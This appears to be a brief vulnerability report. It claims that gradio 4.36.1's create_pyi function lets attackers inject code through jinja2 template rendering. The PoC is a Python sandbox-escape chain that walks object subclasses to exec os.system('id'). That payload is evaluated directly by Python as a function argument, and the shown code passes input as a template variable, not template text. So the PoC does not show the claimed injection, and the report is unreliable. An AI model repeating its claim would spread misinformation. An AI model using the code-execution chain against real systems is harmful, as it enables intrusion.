### version

4.36.1

### description

When users generate pyi, they do not check the input, which leads to code injection by jinja2 during rendering.

### Source code

```python
def create_pyi(class_code: str, events: list[EventListener | str]):
    template = Template(INTERFACE_TEMPLATE)
    events = [e if isinstance(e, str) else e.event_name for e in events]
    return template.render(events=events, contents=class_code)
```

PoC:

```python
import gradio as gr

# Define the events
events = ["on_load"]

pyi_code = gr.component_meta.create_pyi(''.__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['exec']('import os; os.system("id")') , events)
```

### Impact:

The vulnerability allows attackers to execute arbitrary code.
